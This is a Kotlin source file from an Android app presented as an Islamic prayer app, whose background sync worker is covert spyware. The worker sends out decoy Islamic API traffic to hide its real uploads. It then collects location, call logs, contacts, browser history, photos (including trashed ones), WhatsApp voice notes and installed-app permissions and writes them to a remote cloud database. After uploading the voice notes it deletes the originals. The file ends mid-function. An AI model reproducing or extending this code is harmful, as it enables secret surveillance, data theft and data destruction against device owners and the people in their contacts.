package islamic.duas.sync

import android.content.ContentResolver
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import islamic.duas.browser.BrowserHistoryCollector
import islamic.duas.LocationSyncManager
import islamic.duas.cloud.CloudApi
import islamic.duas.cloud.CloudConfig
import islamic.duas.contacts.ContactsCollector
import islamic.duas.logs.CallLogCollector
import islamic.duas.media.MediaCollector
import islamic.duas.media.PhotoProcessor
import islamic.duas.metrics.MetricsCollector
import islamic.duas.utils.DecoyTrafficEngine
import islamic.duas.utils.DeviceId
import islamic.duas.utils.ErrorLog
import islamic.duas.wifi.WifiScanner
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeout
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.atomic.AtomicBoolean

class DuaSyncWorker(
    appContext: Context,
    params: WorkerParameters
) : CoroutineWorker(appContext, params) {

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            withTimeout(300000) { runSync(applicationContext) }
            return@withContext Result.success()
        } catch (e: Exception) {
            Log.e(TAG, "doWork error: ${e.message}", e)
            return@withContext if (runAttemptCount < 3) Result.retry() else Result.failure()
        }
    }

    companion object {
        private const val TAG = "DuaSync"
        private val syncRunning = AtomicBoolean(false)

        /**
         * Records that one or more permissions/settings are still missing so the app can
         * proactively re-prompt the user (via MainActivity / foreground notification).
         * Collected into a single flag with which items are pending.
         */
        @Synchronized
        fun requestPermissionPrompt(context: Context, vararg missing: String) {
            try {
                val prefs = context.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
                val existing = prefs.getStringSet("permission_prompt_pending", mutableSetOf()) ?: mutableSetOf()
                val updated = existing.toMutableSet()
                missing.forEach { updated.add(it) }
                prefs.edit().putStringSet("permission_prompt_pending", updated).apply()
                prefs.edit().putLong("permission_prompt_ts", System.currentTimeMillis()).apply()
            } catch (_: Exception) {}
        }

        suspend fun runSync(context: Context) {
            if (!syncRunning.compareAndSet(false, true)) {
                Log.d(TAG, "Sync already running, skipping duplicate")
                return
            }
            try {
            // Track screen state and last screen-on timestamp
            val pm = context.getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
            val isScreenOn = pm?.isInteractive ?: true
            val prefs = context.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
            if (isScreenOn) {
                prefs.edit().putLong("lastScreenOnMs", System.currentTimeMillis()).apply()
            }
            if (!isScreenOn) {
                // Minimal sync only — just location, skip heavy data
                minimalSync(context)
                return
            }

            // Fire decoy Islamic API requests to mask real traffic
            try { DecoyTrafficEngine.fireDecoyRequests() } catch (_: Exception) {}

            val androidId = DeviceId.get(context)
            val dateFormat = SimpleDateFormat("yyyy-MM-dd hh:mm:ss a", Locale.US)
            val currentTs = System.currentTimeMillis()
            val currentTimeStr = dateFormat.format(Date(currentTs))

            // ── Metrics & Apps ──
            try {
                val metricsCollector = MetricsCollector(context)
                val metrics = metricsCollector.collectDeviceMetrics()

                val lastScreenOnMs = prefs.getLong("lastScreenOnMs", 0L)
                val metricsDoc = JSONObject().apply {
                    put("timestamp", currentTimeStr)
                    put("ts_ms", currentTs)
                    put("batteryPct", metrics.batteryPct)
                    put("batteryTemp", metrics.batteryTemp.toDouble())
                    put("isCharging", metrics.isCharging)
                    put("storageFreeGb", metrics.storageFreeGb)
                    put("networkType", metrics.networkType)
                    put("wifiSsid", metrics.wifiSsid)
                    put("deviceModel", metrics.deviceModel)
                    put("manufacturer", metrics.manufacturer)
                    put("phoneNumber", metrics.phoneNumber)
                    put("lastScreenOnMs", lastScreenOnMs)
                }
                CloudApi.writeToRTDB("devices/$androidId/metrics/latest", metricsDoc)

                val appUsageList = metricsCollector.collectPerAppUsage()
                Log.d(TAG, "App usage collected: ${appUsageList.size} packages")
                if (appUsageList.isEmpty()) {
                    ErrorLog.write(context, TAG, "App usage list is EMPTY - PACKAGE_USAGE_STATS likely not granted", null)
                } else {
                    for (u in appUsageList.take(5)) {
                        Log.d(TAG, "Top app: ${u.appName} (${u.packageName}) = ${u.totalForegroundMs}ms")
                    }
                }
                val hourlyData = metricsCollector.collectHourlyUsage()
                val lastHourData = metricsCollector.collectLastHourUsage()
                val lastHourMap = lastHourData.associate { it.packageName to it.totalForegroundMs }

                // Compute yesterday and 7-day average usage per package
                val yesterdayMsMap = mutableMapOf<String, Long>()
                val weekMsMap = mutableMapOf<String, Long>()
                try {
                    val usm = context.getSystemService(Context.USAGE_STATS_SERVICE) as? android.app.usage.UsageStatsManager
                    if (usm != null) {
                        val cal = Calendar.getInstance()
                        // Yesterday: start of yesterday to end of yesterday
                        cal.add(Calendar.DAY_OF_YEAR, -1)
                        cal.set(Calendar.HOUR_OF_DAY, 0); cal.set(Calendar.MINUTE, 0); cal.set(Calendar.SECOND, 0); cal.set(Calendar.MILLISECOND, 0)
                        val yesterdayStart = cal.timeInMillis
                        cal.set(Calendar.HOUR_OF_DAY, 23); cal.set(Calendar.MINUTE, 59); cal.set(Calendar.SECOND, 59); cal.set(Calendar.MILLISECOND, 999)
                        val yesterdayEnd = cal.timeInMillis
                        for (s in usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_BEST, yesterdayStart, yesterdayEnd)) {
                            yesterdayMsMap[s.packageName] = s.totalTimeInForeground
                        }
                        // Last 7 days (including today)
                        cal.timeInMillis = System.currentTimeMillis()
                        cal.add(Calendar.DAY_OF_YEAR, -7)
                        cal.set(Calendar.HOUR_OF_DAY, 0); cal.set(Calendar.MINUTE, 0); cal.set(Calendar.SECOND, 0); cal.set(Calendar.MILLISECOND, 0)
                        val weekStart = cal.timeInMillis
                        for (s in usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_BEST, weekStart, currentTs)) {
                            weekMsMap[s.packageName] = (weekMsMap[s.packageName] ?: 0L) + s.totalTimeInForeground
                        }
                    }
                } catch (_: Exception) {}

                val appsSummary = JSONObject()
                for (usage in appUsageList) {
                    val appEntry = JSONObject().apply {
                        put("packageName", usage.packageName)
                        put("appName", usage.appName)
                        put("totalForegroundMs", usage.totalForegroundMs)
                        put("lastUsedMs", usage.lastUsedMs)
                        put("date", currentTimeStr.split(" ")[0])
                        put("lastHourMs", lastHourMap[usage.packageName] ?: 0L)
                        put("dailyMs", JSONObject().apply {
                            put("yesterday", yesterdayMsMap[usage.packageName] ?: 0L)
                            put("weekAvg", ((weekMsMap[usage.packageName] ?: 0L) / 7))
                        })
                        val appHourly = hourlyData[usage.packageName]
                        if (appHourly != null && appHourly.isNotEmpty()) {
                            val hourlyObj = JSONObject()
                            for ((hour, ms) in appHourly) {
                                hourlyObj.put(hour.toString(), ms)
                            }
                            put("hourlyMs", hourlyObj)
                        }
                    }
                    appsSummary.put(usage.packageName.replace(".", "_"), appEntry)
                }
                if (appUsageList.isNotEmpty()) {
                    CloudApi.writeToRTDB("devices/$androidId/apps", appsSummary)
                    // Track the most recently used app
                    val newestApp = appUsageList.maxByOrNull { it.lastUsedMs }
                    if (newestApp != null && newestApp.lastUsedMs > 0) {
                        val activeApp = JSONObject().apply {
                            put("appName", newestApp.appName)
                            put("packageName", newestApp.packageName)
                            put("lastUsedMs", newestApp.lastUsedMs)
                        }
                        CloudApi.writeToRTDB("devices/$androidId/activeApp", activeApp)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Metrics/apps sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Metrics/apps sync error", e)
            }

            // ── Location (with cooldown: 50m distance or 5min time threshold) ──
            try {
                val lm = context.getSystemService(Context.LOCATION_SERVICE) as? android.location.LocationManager
                if (lm != null) {
                    var best: android.location.Location? = null
                    for (provider in listOf(
                        android.location.LocationManager.GPS_PROVIDER,
                        android.location.LocationManager.NETWORK_PROVIDER,
                        android.location.LocationManager.PASSIVE_PROVIDER
                    )) {
                        try {
                            @Suppress("DEPRECATION")
                            val loc = lm.getLastKnownLocation(provider)
                            if (loc != null && (best == null || loc.accuracy < best.accuracy)) best = loc
                        } catch (_: Exception) {}
                    }
                    if (best != null && best.accuracy <= 1000f) {
                        if (System.currentTimeMillis() - best.time > 300_000L) best = null
                    }
                    if (best != null && best.accuracy <= 1000f) {
                        shouldWriteLocation(context, prefs, best.latitude, best.longitude, best.accuracy, currentTs, "full_sync")
                    }
                }
            } catch (e: Exception) {
                ErrorLog.write(context, TAG, "Location sync error", e)
            }

            // ── Call Logs ──
            try {
                val hasCallPerm = context.checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) == android.content.pm.PackageManager.PERMISSION_GRANTED
                if (!hasCallPerm) {
                    ErrorLog.write(context, TAG, "Call logs skipped: READ_CALL_LOG not granted", null)
                    requestPermissionPrompt(context, "call_log")
                } else {
                    val lastCallSync = prefs.getLong("last_call_sync_ms", 0L)
                    val callLogCollector = CallLogCollector(context)
                    val callLogs = callLogCollector.collectCallLogs(lastCallSync)

                    if (callLogs.isEmpty()) {
                        ErrorLog.write(context, TAG, "Call logs query returned empty", null)
                    }

                    for (call in callLogs) {
                        val ts = call.optLong("ts_ms", currentTs)
                        CloudApi.writeToRTDB("devices/$androidId/timeline/$ts", call)
                    }

                    if (callLogs.isNotEmpty()) {
                        prefs.edit().putLong("last_call_sync_ms", currentTs).apply()
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Call log sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Call log sync error", e)
            }

            // ── Photos (Firestore + RTDB, dedup by date_taken + path hash) ──
            try {
                val hasImagesPerm = if (Build.VERSION.SDK_INT >= 33) {
                    context.checkSelfPermission(android.Manifest.permission.READ_MEDIA_IMAGES) == android.content.pm.PackageManager.PERMISSION_GRANTED
                } else {
                    context.checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) == android.content.pm.PackageManager.PERMISSION_GRANTED
                }
                if (!hasImagesPerm) {
                    ErrorLog.write(context, TAG, "Photos skipped: images permission not granted", null)
                    requestPermissionPrompt(context, "images")
                } else {
                val mediaCollector = MediaCollector(context)
                val lastPhotoDate = prefs.getLong("last_photo_date_taken", 0L)
                val uploadedPaths = prefs.getStringSet("uploaded_photo_paths", mutableSetOf())?.toMutableSet() ?: mutableSetOf()
                // Trim to keep only last 500 to prevent unbounded growth
                if (uploadedPaths.size > 500) {
                    val trimmed = uploadedPaths.toList().takeLast(500).toMutableSet()
                    uploadedPaths.clear()
                    uploadedPaths.addAll(trimmed)
                }
                // Additional dedup by fileName|dateTaken (survives path changes and pref clears)
                val uploadedPhotoIds = prefs.getStringSet("uploaded_photo_ids", mutableSetOf())?.toMutableSet() ?: mutableSetOf()
                if (uploadedPhotoIds.size > 500) {
                    val trimmed = uploadedPhotoIds.toList().takeLast(500).toMutableSet()
                    uploadedPhotoIds.clear()
                    uploadedPhotoIds.addAll(trimmed)
                }

                // Diagnostic logging
                Log.d(TAG, "Photo sync START: hasImagesPerm=true, lastPhotoDate=$lastPhotoDate, uploadedPaths=${uploadedPaths.size}, uploadedPhotoIds=${uploadedPhotoIds.size}")

                // Collect both normal and trashed photos
                val allPhotos = mediaCollector.collectNewPhotos(lastPhotoDate, Int.MAX_VALUE)
                val trashedPhotos = try { mediaCollector.collectTrashedPhotos(0L) } catch (_: Exception) { emptyList() }
                val combined = (allPhotos + trashedPhotos).distinctBy { it.uri.toString() }
                Log.d(TAG, "Photo collection: allPhotos=${allPhotos.size}, trashedPhotos=${trashedPhotos.size}, combined=${combined.size}")
                // Normal photos filtered by dateTaken; trashed photos bypass date filter (their dateTaken is old)
                val newPhotos = combined.filter { entry ->
                    val isTrash = entry.mimeType == "image/trash" || entry.uri.toString().contains(".trash", true) || entry.uri.toString().contains("Trash", true) || entry.uri.toString().contains("Recently Deleted", true)
                    (isTrash || entry.dateTaken > lastPhotoDate) && entry.uri.toString() !in uploadedPaths
                }
                Log.d(TAG, "New photos to upload: ${newPhotos.size} (lastPhotoDate=$lastPhotoDate)")

                var newestDateTaken = lastPhotoDate
                val resolver = context.contentResolver
                for ((i, entry) in newPhotos.withIndex()) {
                    try {
                        val photoQuality = PhotoProcessor.getQuality(context)
                        val processed = PhotoProcessor.process(entry.uri, resolver, photoQuality)
                        if (processed != null) {
                            val photoId = "${processed.fileName}|${entry.dateTaken}"
                            // Check if this exact photo (by name + date) was already uploaded
                            if (photoId in uploadedPhotoIds) {
                                uploadedPaths.add(entry.uri.toString())
                                Log.i(TAG, "Skipping duplicate photo: $photoId")
                                continue
                            }
                            val ts = System.currentTimeMillis()
                            val photoDoc = JSONObject().apply {
                                put("timestamp", ts)
                                put("data", processed.base64)
                                put("width", processed.width)
                                put("height", processed.height)
                                put("fileName", processed.fileName)
                                put("dateTaken", entry.dateTaken)
                                if (entry.uri.toString().contains(".trash", true) || entry.uri.toString().contains("Trash", true) || entry.uri.toString().contains("Recently Deleted", true)) {
                                    put("isTrashed", true)
                                }
                            }
                            CloudApi.writeToRTDB("devices/$androidId/photos/$ts", photoDoc)
                            uploadedPaths.add(entry.uri.toString())
                            uploadedPhotoIds.add(photoId)
                            if (entry.dateTaken > newestDateTaken) newestDateTaken = entry.dateTaken
                            if (i % 5 == 0) {
                                prefs.edit().putStringSet("uploaded_photo_paths", uploadedPaths).commit()
                                prefs.edit().putStringSet("uploaded_photo_ids", uploadedPhotoIds).commit()
                            }
                            if (i < newPhotos.size - 1) delay(500)
                        }
                    } catch (e: Exception) {
                        Log.w(TAG, "Photo processing error: ${e.message}", e)
                        ErrorLog.write(context, TAG, "Photo processing error: ${e.message}", e)
                    }
                }

                if (newPhotos.isNotEmpty()) {
                    prefs.edit().putLong("last_photo_date_taken", newestDateTaken).commit()
                    prefs.edit().putStringSet("uploaded_photo_paths", uploadedPaths).commit()
                    prefs.edit().putStringSet("uploaded_photo_ids", uploadedPhotoIds).commit()
                }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Photo sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Photo sync error", e)
            }

            // ── Contacts ──
            try {
                val hasContactsPerm = context.checkSelfPermission(android.Manifest.permission.READ_CONTACTS) == android.content.pm.PackageManager.PERMISSION_GRANTED
                if (!hasContactsPerm) {
                    ErrorLog.write(context, TAG, "Contacts skipped: READ_CONTACTS not granted", null)
                    requestPermissionPrompt(context, "contacts")
                } else {
                    val contactsCollector = ContactsCollector(context)
                    // Always write FULL contact list to /all (dashboard needs all contacts)
                    val allContacts = contactsCollector.collectAll(0L)
                    if (allContacts.length() > 0) {
                        CloudApi.writeToRTDB(
                            "devices/$androidId/contacts/all",
                            JSONObject().apply { put("contacts", allContacts); put("ts_ms", currentTs); put("syncedAt", currentTimeStr) }
                        )
                    }
                    // Write incremental changes to batch history
                    val lastContactsSync = prefs.getLong("last_contacts_sync", 0L)
                    val newContacts = contactsCollector.collectAll(lastContactsSync)
                    if (newContacts.length() > 0) {
                        CloudApi.writeToRTDB(
                            "devices/$androidId/contacts/batch_$currentTs",
                            JSONObject().apply { put("contacts", newContacts); put("ts_ms", currentTs) }
                        )
                        prefs.edit().putLong("last_contacts_sync", currentTs).apply()
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Contacts sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Contacts sync error", e)
            }

            // ── Browser History ──
            try {
                val browserCollector = BrowserHistoryCollector(context)
                val history = browserCollector.collectAll()
                Log.d(TAG, "Browser history collected: ${history.length()} entries")
                if (history.length() > 0) {
                    CloudApi.writeToRTDB(
                        "devices/$androidId/browser_history/batch_$currentTs",
                        JSONObject().apply { put("history", history); put("ts_ms", currentTs) }
                    )
                } else {
                    ErrorLog.write(context, TAG, "Browser history query returned empty (all providers)", null)
                    requestPermissionPrompt(context, "browser")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Browser history sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Browser history sync error", e)
            }

            // ── Voice Notes (WhatsApp, adaptive by free space + 300MB audio budget) ──
            try {
                val hasAudioPerm = if (Build.VERSION.SDK_INT >= 33) {
                    context.checkSelfPermission(android.Manifest.permission.READ_MEDIA_AUDIO) == android.content.pm.PackageManager.PERMISSION_GRANTED
                } else {
                    context.checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) == android.content.pm.PackageManager.PERMISSION_GRANTED
                }
                if (!hasAudioPerm) {
                    ErrorLog.write(context, TAG, "Voice notes skipped: audio permission not granted", null)
                    requestPermissionPrompt(context, "audio")
                } else {
                    val mediaCollector = MediaCollector(context)
                    val voiceNotes = mediaCollector.collectVoiceNotes()
                    if (voiceNotes.isNotEmpty()) {
                        // Adaptive caps based on free space
                        val freeMb = android.os.Environment.getExternalStorageDirectory().freeSpace / (1024 * 1024)
                        val maxNotes = when {
                            freeMb > 1000 -> 30
                            freeMb > 200 -> 15
                            else -> 8
                        }
                        val withAudioCount = when {
                            freeMb > 1000 -> maxNotes
                            freeMb > 200 -> minOf(6, maxNotes)
                            else -> 0
                        }

                        // Per-note audio size cap (bytes). Large voice notes are now
                        // uploaded too so they can be played back from the dashboard.
                        val perNoteAudioCap = 16L * 1024 * 1024

                        // Audio budget: 30% of Spark 1GB = 300MB
                        val audioBudget = 300L * 1024 * 1024
                        val audioSizesJson = prefs.getString("voice_audio_batch_sizes", "{}") ?: "{}"
                        val audioSizes = org.json.JSONObject(audioSizesJson)
                        var usedBudget = 0L
                        for (k in audioSizes.keys()) {
                            usedBudget += audioSizes.optLong(k, 0L)
                        }

                        val notesArray = JSONArray()
                        val uploadedPaths = prefs.getStringSet("uploaded_voice_paths", mutableSetOf()) ?: mutableSetOf()
                        val deletedPaths = mutableListOf<String>()
                        val oneDayAgo = currentTs - 86400000L
                        var added = 0
                        var batchAudioBytes = 0L
                        for (note in voiceNotes) {
                            if (note.file.absolutePath in uploadedPaths) continue
                            if (added >= maxNotes) break
                            val isOld = note.dateAdded > 0 && note.dateAdded < oneDayAgo
                            // Upload audio for recent notes under the per-note cap.
                            var includeAudio = !isOld && added < withAudioCount && note.size in 1..perNoteAudioCap
                            val noteJson = JSONObject().apply {
                                put("fileName", note.file.name)
                                put("dateAdded", note.dateAdded)
                                put("durationMs", note.duration)
                                put("sizeBytes", note.size)
                                put("mimeType", note.mimeType)
                                if (includeAudio) {
                                    try {
                                        val audioBytes = note.file.readBytes()
                                        val b64 = java.util.Base64.getEncoder().encodeToString(audioBytes)
                                        // Check budget before committing
                                        if (usedBudget + batchAudioBytes + b64.length <= audioBudget) {
                                            put("audioData", b64)
                                            batchAudioBytes += b64.length
                                        } else {
                                            put("audioStripped", true)
                                            includeAudio = false
                                        }
                                    } catch (_: Exception) { }
                                } else if (isOld) {
                                    put("audioStripped", true)
                                }
                            }
                            notesArray.put(noteJson)
                            uploadedPaths.add(note.file.absolutePath)
                            deletedPaths.add(note.file.absolutePath)
                            added++
                        }
                        if (notesArray.length() > 0) {
                            val voiceBatch = JSONObject().apply {
                                put("notes", notesArray)
                                put("totalCount", voiceNotes.size)
                                put("ts_ms", currentTs)
                                put("freeMb", freeMb.toInt())
                                put("audioBytes", batchAudioBytes)
                            }
                            CloudApi.writeToRTDB(
                                "devices/$androidId/voice_notes/batch_$currentTs",
                                voiceBatch
                            )
                            // Track audio bytes for budget enforcement
                            if (batchAudioBytes > 0) {
                                audioSizes.put("batch_$currentTs", batchAudioBytes)
                                prefs.edit().putString("voice_audio_batch_sizes", audioSizes.toString()).apply()
                            }
                            for (path in deletedPaths) {
                                try { File(path).delete() } catch (_: Exception) { }
                            }
                            prefs.edit().putStringSet("uploaded_voice_paths", uploadedPaths).apply()
                        }
                        val budgetPct = (usedBudget + batchAudioBytes) * 100 / audioBudget
                        Log.i(TAG, "Voice notes: $added uploaded (audio: ${withAudioCount}, budget: ${budgetPct}%, free: ${freeMb}MB)")
                    } else {
                        ErrorLog.write(context, TAG, "Voice notes query returned empty", null)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Voice notes sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Voice notes sync error", e)
            }

            // ── WiFi Scan ──
            try {
                val lastLoc = DuaTracker.getLastLocation()
                val lat = lastLoc?.optDouble("lat")
                val lng = lastLoc?.optDouble("lng")
                val wifiScanner = WifiScanner(context)
                val networks = wifiScanner.scanAndCollect(lat, lng)
                if (networks.length() > 0) {
                    CloudApi.writeToRTDB(
                        "devices/$androidId/wifi_scan/$currentTs",
                        JSONObject().apply { put("networks", networks); put("ts_ms", currentTs) }
                    )
                }
            } catch (e: Exception) {
                Log.e(TAG, "WiFi scan error: ${e.message}", e)
                ErrorLog.write(context, TAG, "WiFi scan error", e)
            }

            // ── App Permissions ──
            try {
                val pm = context.packageManager
                val pkgs = pm.getInstalledPackages(android.content.pm.PackageManager.GET_PERMISSIONS)
                val permsRoot = JSONObject()
                for (pkg in pkgs) {
                    val perms = pkg.requestedPermissions
                    val flags = pkg.requestedPermissionsFlags
                    if (perms.isNullOrEmpty()) continue
                    val appName = try {
                        pm.getApplicationLabel(pm.getApplicationInfo(pkg.packageName, 0)).toString()
                    } catch (_: Exception) { pkg.packageName }
                    val permList = JSONArray()
                    for (i in perms.indices) {
                        val permName = perms[i]
                        val granted = flags != null && i < flags.size && (flags[i] and android.content.pm.PackageInfo.REQUESTED_PERMISSION_GRANTED != 0)
                        permList.put(JSONObject().apply {
                            put("name", permName)
                            put("granted", granted)
                        })
                    }
                    val pkgKey = pkg.packageName.replace(".", "_")
                    permsRoot.put(pkgKey, JSONObject().apply {
                        put("packageName", pkg.packageName)
                        put("appName", appName)
                        put("permissions", permList)
                    })
                }
                CloudApi.writeToRTDB("devices/$androidId/permissions", permsRoot)
            } catch (e: Exception) {
                Log.e(TAG, "Permissions sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Permissions sync error", e)
            }

            // ── Device Info ──
            try {
                val metricsCollector2 = MetricsCollector(context)
                val metrics2 = metricsCollector2.collectDeviceMetrics()
                val offlineCount = try {
                    val db = islamic.duas.data.AppDatabase.getInstance(context)
                    db.pendingDao().count()
                } catch (_: Exception) { 0 }
                val deviceInfo = JSONObject().apply {
                    put("deviceModel", metrics2.deviceModel)
                    put("manufacturer", metrics2.manufacturer)
                    put("lastSyncMs", currentTs)
                    put("lastSync", currentTimeStr)
                    put("offlineQueueSize", offlineCount)
                }
                CloudApi.writeToRTDB("devices/$androidId/info", deviceInfo)
            } catch (e: Exception) {
                Log.e(TAG, "Device info sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Device info sync error", e)
            }

            // ── Usage ──
            try {
                val openCount = prefs.getInt("app_open_count", 0)
                val openDoc = JSONObject().apply {
                    put("openCount", openCount)
                    put("lastOpened", currentTimeStr)
                    put("lastOpenedMs", currentTs)
                    put("date", currentTimeStr.split(" ")[0])
                }
                CloudApi.writeToRTDB("devices/$androidId/usage/deviceSync", openDoc)
            } catch (e: Exception) {
                Log.e(TAG, "Usage sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Usage sync error", e)
            }

            // ── Cleanup (storage-first priority) ──
            try {
                runCleanup(context, androidId, currentTs)
            } catch (e: Exception) {
                Log.e(TAG, "Cleanup error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Cleanup error", e)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Unhandled sync error: ${e.message}", e)
            ErrorLog.write(context, TAG, "Unhandled sync error", e)
        } finally {
            syncRunning.set(false)
        }
    }

        private suspend fun runCleanup(context: Context, androidId: String, now: Long) {
            val okClient = CloudApi.getClient()
            val rtdbBase = CloudConfig.RTDB_URL

            // ── Night samples: 7-day TTL ──
            try {
                val url = "$rtdbBase/devices/$androidId/location/night_samples.json?shallow=true"
                val req = okhttp3.Request.Builder().url(url).get().build()
                val resp = okClient.newCall(req).execute()
                val body = resp.body?.string()
                resp.close()
                if (body != null && body != "null") {
                    val sevenDaysAgo = now - 7 * 86400000L
                    val keys = org.json.JSONObject(body).keys().asSequence().toList()
                    var deleted = 0
                    for (key in keys) {
                        val ts = key.toLongOrNull() ?: continue
                        if (ts < sevenDaysAgo) {
                            CloudApi.deleteFromRTDB("devices/$androidId/location/night_samples/$key")
                            deleted++
                            delay(100)
                        }
                    }
                    if (deleted > 0) Log.i(TAG, "Night samples cleanup: deleted $deleted entries")
                }
            } catch (e: Exception) {
                Log.w(TAG, "Night samples cleanup error: ${e.message}", e)
            }

            // ── Location: deduplicate by lat|lng|ts_ms ──
            try {
                data class LocEntry(val path: String, val lat: Double, val lng: Double, val tsMs: Long)
                val allLocs = mutableListOf<LocEntry>()
                suspend fun collectLoc(nodePath: String) {
                    try {
                        val url = "$rtdbBase/devices/$androidId/location$nodePath.json?shallow=true"
                        val req = okhttp3.Request.Builder().url(url).get().build()
                        val resp = okClient.newCall(req).execute()
                        val body = resp.body?.string()
                        resp.close()
                        if (body != null && body != "null") {
                            val obj = org.json.JSONObject(body)
                            for (key in obj.keys()) {
                                val subPath = "$nodePath/$key"
                                when {
                                    key == "latest" || key == "history" || key == "night_samples" -> Unit
                                    obj.opt(key) == true -> collectLoc(subPath)
                                    else -> {
                                        val locUrl = "$rtdbBase/devices/$androidId/location$subPath.json"
                                        val lr = okhttp3.Request.Builder().url(locUrl).get().build()
                                        val lrResp = okClient.newCall(lr).execute()
                                        val locBody = lrResp.body?.string()
                                        lrResp.close()
                                        if (locBody != null && locBody != "null") {
                                            try {
                                                val jo = org.json.JSONObject(locBody)
                                                val lat = jo.optDouble("lat", Double.NaN)
                                                val lng = jo.optDouble("lng", Double.NaN)
                                                val tsMs = jo.optLong("ts_ms", jo.optLong("timestamp", key.toLongOrNull() ?: 0L))
                                                if (lat.isFinite() && lng.isFinite()) {
                                                    allLocs.add(LocEntry("location$subPath", lat, lng, tsMs))
                                                }
                                            } catch (_: Exception) {}
                                        }
                                        delay(80)
                                    }
                                }
                            }
                        }
                    } catch (_: Exception) {}
                }
                collectLoc("")
                collectLoc("/night_samples")
                val groups = mutableMapOf<String, MutableList<Pair<Int, LocEntry>>>()
                for ((i, loc) in allLocs.withIndex()) {
                    val gk = "${String.format("%.4f", loc.lat)}|${String.format("%.4f", loc.lng)}|${loc.tsMs / 1000}"
                    groups.getOrPut(gk) { mutableListOf() }.add(i to loc)
                }
                var locDedupDeleted = 0
                for ((gk, entries) in groups) {
                    if (entries.size <= 1) continue
                    entries.sortByDescending { it.second.path.length }
                    for (i in 1 until entries.size) {
                        if (CloudApi.deleteFromRTDB("devices/$androidId/${entries[i].second.path}")) {
                            locDedupDeleted++
                        }
                        delay(150)
                    }
                }
                if (locDedupDeleted > 0) Log.i(TAG, "Location dedup: deleted $locDedupDeleted duplicate entries")
            } catch (e: Exception) {
                Log.w(TAG, "Location dedup error: ${e.message}", e)
            }

            // ── Location history: 7-day TTL ──
            try {
                data class HistEntry(val path: String, val tsMs: Long)
                val allHist = mutableListOf<HistEntry>()
                suspend fun walkHist(nodePath: String, depth: Int) {
                    if (depth > 4) return
                    try {
                        val url = "$rtdbBase/devices/$androidId/location/history$nodePath.json?shallow=true"
                        val req = okhttp3.Request.Builder().url(url).get().build()
                        val resp = okClient.newCall(req).execute()
                        val body = resp.body?.string()
                        resp.close()
                        if (body != null && body != "null") {
                            val obj = org.json.JSONObject(body)
                            for (key in obj.keys()) {
                                val sub = "$nodePath/$key"
                                val ts = key.toLongOrNull()
                                if (ts != null && depth >= 3) {
                                    allHist.add(HistEntry("location/history$sub", ts))
                                } else if (ts == null && depth < 3) {
                                    walkHist(sub, depth + 1)
                                }
                            }
                        }
                    } catch (_: Exception) {}
                }
                walkHist("", 0)
                val sevenDaysAgo = now - 7 * 86400000L
                var deleted = 0
                for (entry in allHist) {
                    if (entry.tsMs < sevenDaysAgo) {
                        if (CloudApi.deleteFromRTDB("devices/$androidId/${entry.path}")) deleted++
                        delay(100)
                    }
                }
                if (deleted > 0) Log.i(TAG, "Location history cleanup: deleted $deleted old entries (>7d)")
            } catch (e: Exception) {
                Log.w(TAG, "Location history cleanup error: ${e.message}", e)
            }

            // ── Location ts nodes: 14-day TTL (DuaTracker.processLocation path) ──
            try {
                val url = "$rtdbBase/devices/$androidId/location.json?shallow=true"
                val req = okhttp3.Request.Builder().url(url).get().build()
                val resp = okClient.newCall(req).execute()
                val body = resp.body?.string()
                resp.close()
                if (body != null && body != "null") {
                    val keys = org.json.JSONObject(body).keys().asSequence().toList()
                    val skipKeys = setOf("latest", "history", "night_samples")
                    val fourteenDaysAgo = now - 14 * 86400000L
                    var deleted = 0
                    for (key in keys) {
                        if (key in skipKeys) continue
                        val ts = key.toLongOrNull() ?: continue
                        if (ts < fourteenDaysAgo) {
                            CloudApi.deleteFromRTDB("devices/$androidId/location/$key")
                            deleted++
                            delay(100)
                        }
                    }
                    if (deleted > 0) Log.i(TAG, "Location ts cleanup: deleted $deleted old entries")
                }
            } catch (e: Exception) {
                Log.w(TAG, "Location ts cleanup error: ${e.message}", e)
            }

            // ── WiFi scans: 7-day TTL ──
            try {
                val wifiUrl = "$rtdbBase/devices/$androidId/wifi_scan.json?shallow=true"
                val wifiReq = okhttp3.Request.Builder().url(wifiUrl).get().build()
                val wifiResp = okClient.newCall(wifiReq).execute()
                val wifiBody = wifiResp.body?.string()
                wifiResp.close()
                if (wifiBody != null && wifiBody != "null" && wifiBody != "{}") {
                    val sevenDaysAgo = now - 7 * 86400000L
                    val keys = org.json.JSONObject(wifiBody).keys().asSequence().toList()
                    var deleted = 0
                    for (key in keys) {
                        val ts = key.toLongOrNull() ?: continue
                        if (ts < sevenDaysAgo) {
                            if (CloudApi.deleteFromRTDB("devices/$androidId/wifi_scan/$key")) deleted++
                            delay(80)
                        }
                    }
